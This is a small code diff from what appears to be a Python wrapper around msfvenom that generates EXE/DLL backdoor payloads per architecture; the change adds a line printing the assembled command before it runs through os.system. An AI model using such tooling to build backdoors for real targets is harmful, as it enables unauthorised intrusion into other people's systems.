@@ -35,6 +35,7 @@ class gen(object):
 		args += '-f ' + fmt
 		command = 'msfvenom -p ' + self.exe_dll_payload.get(arch).get(ctype) + ' ' + args + ' > tmp/' + arch + '.' + fmt
 		cprint('Generating ' + arch + ' EXE/DLL Backdoor','info')
+		print(command)
 		os.system(command)
 		cprint('Generated Successfully! Files saved at ' + os.path.abspath('./tmp'),'succ')
 
